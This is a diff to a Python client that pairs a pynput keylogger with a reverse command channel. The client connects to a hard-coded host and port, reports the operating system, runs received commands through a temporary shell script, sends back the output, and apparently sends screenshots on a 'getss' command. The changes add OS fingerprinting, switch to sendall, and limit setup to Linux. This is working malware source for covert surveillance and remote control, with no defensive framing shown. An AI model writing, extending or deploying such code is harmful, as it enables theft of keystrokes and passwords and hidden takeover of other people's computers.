@@ -1,6 +1,6 @@
 from pynput.keyboard import Key, Listener
 import socket, subprocess, threading, pyautogui, datetime
-import sendss, time, os
+import sendss, time, os, platform
 
 def start_keylogging():
     def on_press(key):
@@ -16,11 +16,12 @@ def start_keylogging():
 def start_client():
     HOST = "192.168.24.5"
     #HOST = "172.16.120.153"
-    PORT = 20030
+    PORT = 5678
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     s.connect((HOST, PORT))
+    s.send(bytes(platform.system(), encoding = "utf8"))
     while True:
         data = s.recv(1024)
         if data.decode() == "":
@@ -32,7 +33,7 @@ def start_client():
             os.system("./tempBash.sh")
             output = open("bashOutput", "rb").read()
             if output:
-                s.send(output)
+                s.sendall(output)
             else:
                 s.send(b"OK")
         elif c[0] == "getss":
@@ -55,10 +56,10 @@ def start_client():
         print(c)
 
 if __name__ == "__main__":
-
-    open("tempBash.sh", "w")
-    open("bashOutput", "w")
-    os.system("chmod +x tempBash.sh")
+    if platform.system() == "Linux":
+        open("tempBash.sh", "w")
+        open("bashOutput", "w")
+        os.system("chmod +x tempBash.sh")
 
     t1 = threading.Thread(target = start_keylogging)
     t2 = threading.Thread(target = start_client)
